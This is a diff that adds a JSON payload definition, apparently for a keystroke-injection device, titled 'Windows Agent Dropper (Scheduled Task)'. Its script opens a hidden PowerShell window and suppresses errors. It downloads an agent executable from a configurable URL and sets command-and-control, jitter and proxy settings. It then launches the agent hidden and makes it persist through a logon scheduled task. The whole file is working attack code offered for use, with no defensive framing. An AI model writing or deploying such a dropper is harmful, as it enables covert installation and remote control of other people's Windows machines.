@@ -1,0 +1,7 @@
+{
+  "name": "Windows Agent Dropper (Scheduled Task)",
+  "category": "Persistence",
+  "os": "Windows",
+  "description": "Hidden PowerShell dropper that downloads the agent, jitters, launches, and persists via a user Scheduled Task (OnLogon). Set: AGENT_URL, C2_URL, JITTER, SLEEP, PROXY",
+  "script": "REM Windows Agent Dropper with Scheduled Task persistence (user)\nGUI r\nDELAY 400\nSTRING powershell -w hidden -nop -c \"$ErrorActionPreference='SilentlyContinue';$u='${AGENT_URL}';$d=$env:LOCALAPPDATA+'\\DB';New-Item -Force -ItemType Directory -Path $d|Out-Null;$p=$d+'\\db-agent.exe';try{iwr $u -UseBasicParsing -OutFile $p}catch{$p=$env:TEMP+'\\db-agent.exe';iwr $u -UseBasicParsing -OutFile $p};$env:DB_C2='${C2_URL}';$env:DB_SLEEP='${SLEEP:=60}';$env:DB_JITTER='${JITTER:=30}';if('${PROXY}' -ne ''){$env:DB_PROXY='${PROXY}'};Start-Sleep -Seconds (Get-Random -Maximum ([int]$env:DB_JITTER));Start-Process -FilePath $p -WindowStyle Hidden;schtasks /Create /SC ONLOGON /TN \"DB-Agent\" /TR '""'+$p+'""' /RL LIMITED /F\"\nENTER\n"
+}
